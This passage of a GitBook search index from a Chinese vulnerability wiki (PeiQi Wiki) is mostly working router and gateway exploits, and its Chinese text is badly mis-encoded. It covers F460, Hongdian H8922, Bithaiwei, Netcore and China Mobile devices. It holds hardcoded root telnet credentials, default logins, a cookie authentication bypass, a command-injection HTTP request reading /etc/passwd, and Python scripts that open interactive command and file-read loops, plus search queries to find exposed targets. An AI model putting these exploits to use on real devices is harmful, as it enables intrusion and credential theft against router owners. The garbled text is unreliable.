web_shell_cmd.gch è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 web_shell_cmd.gch è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 web_shell_cmd.gch è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 web_shell_cmd.gch è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 web_shell_cmd.gchæ–‡ä»¶å­˜åœ¨å‘½ä»¤è°ƒè¯•ç•Œé¢ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è·å–æœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 FOFA [!NOTE] title=\"F460\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º web_shell_cmd.gch ç›´æ¥è¾“å…¥å‘½ä»¤å°±å¯ä»¥æ‰§è¡Œ cat /etc/passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/","title":"å®ç”µ","keywords":"","body":"å®ç”µ å®ç”µ H8922 Telnetåé—¨æ¼æ´ CVE-2021-28149 å®ç”µ H8922 åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-28150 å®ç”µ H8922 åå°ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-28151 å®ç”µ H8922 åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-28152 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-28 23:05:22 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 Telnetåé—¨æ¼æ´ CVE-2021-28149.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 Telnetåé—¨æ¼æ´ CVE-2021-28149.html","title":"å®ç”µ H8922 Telnetåé—¨æ¼æ´ CVE-2021-28149","keywords":"","body":"å®ç”µ H8922 Telnetåé—¨æ¼æ´ CVE-2021-28149 æ¼æ´æè¿° å®ç”µ H8922 Telnetå­˜åœ¨ç¡¬ç¼–ç çš„è´¦å·å¯†ç  ä¸”é»˜è®¤å¼€æ”¾ 5188ç«¯å£è¿æ¥ï¼Œå¯ä»¥ä»¥Rootèº«ä»½è·å–æƒé™ æ¼æ´å½±å“ [!NOTE] å®ç”µ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" æ¼æ´å¤ç° ä½¿ç”¨Telnetè¿æ¥ç›®æ ‡5188ç«¯å£ï¼Œè´¦å·å¯†ç ä¸º root/superzxmn PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-28150.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-28150.html","title":"å®ç”µ H8922 åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-28150","keywords":"","body":"å®ç”µ H8922 åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-28150 æ¼æ´æè¿° å®ç”µ H8922 åå°ä¸­çš„ç½‘ç»œæµ‹è¯•æ¨¡å—ä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚é€šè¿‡å‘½ä»¤æ‹¼æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] å®ç”µ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" æ¼æ´å¤ç° ç™»å½•åå°(å­˜åœ¨è®¿å®¢ç”¨æˆ·é»˜è®¤è´¦å·å¯†ç  guest/guest) ä½¿ç”¨ ; å‘½ä»¤æ‹¼æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ è¯·æ±‚åŒ…ä¸º POST /tools.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 96 Cache-Control: max-age=0 Authorization: Basic Z3Vlc3Q6Z3Vlc3Q= Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close op_type=ping&destination=;cat /etc/passwd&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A æ¼æ´POC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : å®ç”µ H8922 åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-28150 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping&destination=;cat /etc/passwd&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/tools.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,å­˜åœ¨è®¿å®¢è´¦å· guest/guest æˆåŠŸæ‰§è¡Œ cat /etc/passwd \\033[0m\".format(target_url)) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(cmd_test)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping&destination=;{}&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(cmd_test)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 åå°ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-28151.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 åå°ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-28151.html","title":"å®ç”µ H8922 åå°ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-28151","keywords":"","body":"å®ç”µ H8922 åå°ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-28151 æ¼æ´æè¿° å®ç”µ H8922 åå°å­˜åœ¨ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œæ”»å‡»è€…ä½¿ç”¨ä»»æ„è´¦å·ç™»å½•åè®¿é—®ç‰¹æ®Šçš„Urlå³å¯è·å–æ‰€æœ‰ç”¨æˆ·çš„è´¦å·å’Œå¯†ç  æ¼æ´å½±å“ [!NOTE] å®ç”µ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" æ¼æ´å¤ç° ç™»å½•åå°(å­˜åœ¨è®¿å®¢ç”¨æˆ·é»˜è®¤è´¦å·å¯†ç  guest/guest) æ¼æ´å­˜åœ¨äº backup2.cgi æ–‡ä»¶ä¸­ åˆ†æåå¯å¾—çŸ¥å®é™…è¿è¡Œåå°†ä¼šè¯»å– /tmp/hdconfig/cli.conf é…ç½®æ–‡ä»¶ å…¶ä¸­é…ç½®æ–‡ä»¶ä¸­æ˜¯å«æœ‰æ‰€æœ‰ç”¨æˆ·å¯†ç ä»¥åŠæ•æ„Ÿé…ç½®ä¿¡æ¯çš„ æ¼æ´POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : å®ç”µ H8922 åå°ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-28151 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/backup2.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/backup2.cgi.... \\033[0m\".format(target_url)) if 'service webadmin' in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,å­˜åœ¨è®¿å®¢è´¦å· guest/guest æˆåŠŸè¯»å–é…ç½®æ–‡ä»¶ \\033[0m\".format(target_url)) print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-28152.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å®ç”µ/å®ç”µ H8922 åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-28152.html","title":"å®ç”µ H8922 åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-28152","keywords":"","body":"å®ç”µ H8922 åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-28152 æ¼æ´æè¿° å®ç”µ H8922 åå°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä½æƒé™ç”¨æˆ·é€šè¿‡æ¼æ´å¯ä»¥è·å–ä»»æ„æ–‡ä»¶å†…å®¹ æ¼æ´å½±å“ [!NOTE] å®ç”µ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" æ¼æ´å¤ç° ç™»å½•åå°(å­˜åœ¨è®¿å®¢ç”¨æˆ·é»˜è®¤è´¦å·å¯†ç  guest/guest) æ¼æ´å­˜åœ¨äº log_download.cgi æ–‡ä»¶ä¸­ ä½¿ç”¨typeå‚æ•°è¯»å–æ–‡ä»¶å¹¶ä¸‹è½½æ—¥å¿—ç»™ç”¨æˆ·ï¼Œä½¿ç”¨ ../../ å¯ä»¥è·³è½¬æ ¹ç›®å½•è¯»å–ä»»æ„æ–‡ä»¶ æ¼æ´POC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : å®ç”µ H8922 åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-28152 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/log_download.cgi?type=../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,å­˜åœ¨è®¿å®¢è´¦å· guest/guest æˆåŠŸè¯»å– /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: filename = input(\"\\033[35mFilename >>> \\033[0m\") if filename == \"exit\": sys.exit(0) else: POC_2(target_url, filename) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] {} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() filename = '/etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, filename) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç¢§æµ·å¨/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç¢§æµ·å¨/","title":"ç¢§æµ·å¨","keywords":"","body":"ç¢§æµ·å¨ ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-11 12:20:59 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç¢§æµ·å¨/ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç¢§æµ·å¨/ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“å­˜åœ¨ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡è´¦å·å¯†ç ç™»å½•åå°åï¼Œé€šè¿‡å‘½ä»¤æ‹¼æ¥é€ æˆå‘½ä»¤æ³¨å…¥ æ¼æ´å½±å“ [!NOTE] ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“ FOFA [!NOTE] \"ç¢§æµ·å¨\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ é»˜è®¤å¯†ç ä¸º adimn/admin or admin123 æ¼æ´å­˜åœ¨äº å‘½ä»¤æ§åˆ¶å°ä¸­ï¼Œå…¶ä¸­å­˜åœ¨å‘½ä»¤æ³¨å…¥ å¯ä»¥ä½¿ç”¨ help & sh å¾—åˆ°äº¤äº’å¼å‘½ä»¤å†™å…¥æ¶æ„æ–‡ä»¶ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç£Šç§‘/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç£Šç§‘/","title":"ç£Šç§‘","keywords":"","body":"PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-09 11:11:37 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç£Šç§‘/ç£Šç§‘ NI360è·¯ç”±å™¨ è®¤è¯ç»•è¿‡æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç£Šç§‘/ç£Šç§‘ NI360è·¯ç”±å™¨ è®¤è¯ç»•è¿‡æ¼æ´.html","title":"ç£Šç§‘ NI360è·¯ç”±å™¨ è®¤è¯ç»•è¿‡æ¼æ´","keywords":"","body":"ç£Šç§‘ NI360è·¯ç”±å™¨ è®¤è¯ç»•è¿‡æ¼æ´ æ¼æ´æè¿° ç£Šç§‘ NI360è·¯ç”±å™¨ å­˜åœ¨è®¤è¯ç»•è¿‡æ¼æ´ï¼Œé€šè¿‡æ·»åŠ ç‰¹å®šçš„Cookieå­—æ®µè·å–åå°æƒé™ æ¼æ´å½±å“ ç£Šç§‘ NI360è·¯ç”±å™¨ FOFA [!NOTE] title=\"Netcore\" æ¼æ´æè¿° ç™»å½•é¡µé¢å¦‚ä¸‹ æ·»åŠ  Cookieå­—æ®µ : netcore_login=guest:1 åˆ·æ–°åç™»å½•åå° PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-09 17:52:28 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­å›½ç§»åŠ¨/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­å›½ç§»åŠ¨/","title":"ä¸­å›½ç§»åŠ¨","keywords":"","body":"ä¸­å›½ç§»åŠ¨ ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± simple-index.asp è¶Šæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-18 17:30:28 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­å›½ç§»åŠ¨/ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± ExportSettings.sh æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­å›½ç§»åŠ¨/ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± ExportSettings.sh æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± ExportSettings.sh æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± ExportSettings.sh æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± ExportSettings.sh å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´è·å–é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± FOFA [!NOTE] title=\"äº’è”ä¸–ç•Œ ç‰©è”æœªæ¥-ç™»å½•\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è®¿é—®Url /cgi-bin/ExportSettings.sh å…¶ä¸­passwordä¸ºç™»å½•åå°å¯†ç  PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-18 18:10:49 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­å›½ç§»åŠ¨/ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± simple-index.asp è¶Šæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­å›½ç§»åŠ¨/ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± simple-index.asp è¶Šæƒè®¿é—®æ¼æ´.html","title":"ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± simple-index.asp è¶Šæƒè®¿é—®æ¼æ´","keywords":"","body":"ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± simple-index.asp è¶Šæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± simple-index.asp å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± FOFA [!NOTE] title=\"äº’è”ä¸–ç•Œ ç‰©è”æœªæ¥-ç™»å½•\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è®¿é—®Url /simple-index.asp â€‹ è¶Šè¿‡ç®¡ç†å‘˜éªŒè¯è·å–Wiflè´¦å·å¯†ç ç­‰ä¿¡æ¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-19 00:18:05 "}}